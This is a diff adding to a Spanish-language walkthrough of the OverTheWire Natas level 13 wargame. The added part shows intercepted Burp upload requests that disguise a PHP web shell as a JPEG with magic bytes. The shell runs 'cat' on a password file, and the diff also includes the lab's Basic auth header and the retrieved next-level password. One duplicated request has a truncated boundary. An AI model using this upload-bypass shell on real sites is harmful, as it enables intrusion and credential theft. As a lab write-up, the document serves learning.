@@ -126,6 +126,73 @@ Bueno ya tenemos el fichero **phpShell.php** recién salido del horno y ahora so
 
 Configuramos el **Proxy** a **localhost:8080** en el navegador y arrancamos el **BURP** para interceptar el tráfico que enviamos y poder modificarlo posteriormente y saltarnos los controles de acceso.
 
+POST /index.php HTTP/1.1
+Host: natas13.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas13.natas.labs.overthewire.org/
+Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------453852881298197434201962635
+Content-Length: 531
+
+-----------------------------453852881298197434201962635
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------453852881298197434201962635
+Content-Disposition: form-data; name="filename"
+
+phvidqtoy7.jpg
+-----------------------------453852881298197434201962635
+Content-Disposition: form-data; name="uploadedfile"; filename="phpShell.php"
+Content-Type: application/x-php
+
+ÿØÿà<? passthru("cat /etc/natas_webpass/natas14"); ?>
+-----------------------------453852881298197434201962635--
+
+
+
+
+POST /index.php HTTP/1.1
+Host: natas13.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas13.natas.labs.overthewire.org/
+Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------453852881298197434201962635
+Content-Length: 531
+
+-----------------------------453852881298197434201962635
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------453852881298197434201962635
+Content-Disposition: form-data; name="filename"
+
+phvidqtoy7.jpg
+-----------------------------453852881298197434201962635
+Content-Disposition: form-data; name="uploadedfile"; filename="phpShell.php"
+Content-Type: application/x-php
+
+ÿØÿà<? passthru("cat /etc/natas_webpass/natas14"); ?>
+-----------------------------4538528812981974342
+
+
+
+
+The file upload/7nu704t5gn.php has been uploaded
+
+
+http://natas13.natas.labs.overthewire.org/upload/7nu704t5gn.php
+
+ÿØÿàLg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
 
 
 
